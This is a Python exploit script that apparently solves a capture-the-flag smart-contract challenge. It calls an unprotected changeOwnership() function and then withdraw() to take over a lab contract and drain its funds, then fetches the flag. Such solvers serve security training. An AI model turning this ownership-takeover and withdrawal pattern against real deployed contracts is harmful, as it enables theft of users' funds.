import requests
from web3 import Web3

# === CONFIGURATION ===
API_URL = "http://MACHINE_IP"  # Replace with the target machine IP
RPC_URL = f"{API_URL}:8545"

# === Connect to the Ethereum Node ===
web3 = Web3(Web3.HTTPProvider(RPC_URL))
if not web3.isConnected():
    print("[!] Failed to connect to the Ethereum node.")
    exit(1)

print("[*] Fetching challenge data...")

# === Fetch Challenge Info ===
challenge_data = requests.get(f"{API_URL}/challenge").json()
private_key = challenge_data["player_wallet"]["private_key"]
player_address = challenge_data["player_wallet"]["address"]
contract_address = challenge_data["contract_address"]

print(f"[+] CONTRACT_ADDRESS: {contract_address}")
print(f"[+] PLAYER_ADDRESS: {player_address}")

# === Define Contract ABI (Minimal required) ===
contract_abi = [
    {
        "inputs": [],
        "name": "changeOwnership",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "withdraw",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function"
    }
]

# === Load the contract ===
contract = web3.eth.contract(address=contract_address, abi=contract_abi)
account = web3.eth.account.from_key(private_key)

def send_transaction(function):
    txn = function.build_transaction({
        'from': account.address,
        'nonce': web3.eth.get_transaction_count(account.address),
        'gas': 200000,
        'gasPrice': web3.to_wei('10', 'gwei')
    })
    signed_txn = account.sign_transaction(txn)
    tx_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)
    return web3.eth.wait_for_transaction_receipt(tx_hash)

# === Attack: Take ownership ===
print("[*] Changing ownership...")
try:
    send_transaction(contract.functions.changeOwnership())
except Exception as e:
    print(f"[!] Error during attack: {e}")
    exit(1)

# === Attack: Withdraw funds ===
print("[*] Withdrawing funds...")
try:
    send_transaction(contract.functions.withdraw())
except Exception as e:
    print(f"[!] Error during withdraw: {e}")
    exit(1)

# === Check if the challenge is solved ===
print("[*] Verifying isSolved()...")
solved = contract.functions.isSolved().call()
print(f"[+] ✅ Challenge Solved!" if solved else "[✘] Challenge NOT solved")

# === Optional: Try to fetch the flag ===
if solved:
    try:
        response = requests.get(f"{API_URL}/flag")
        if response.status_code == 200:
            print(f"[🏁] Flag: {response.text}")
        else:
            print(f"[!] Flag not found (status code: {response.status_code})")
    except Exception as e:
        print(f"[!] Error fetching flag: {e}")
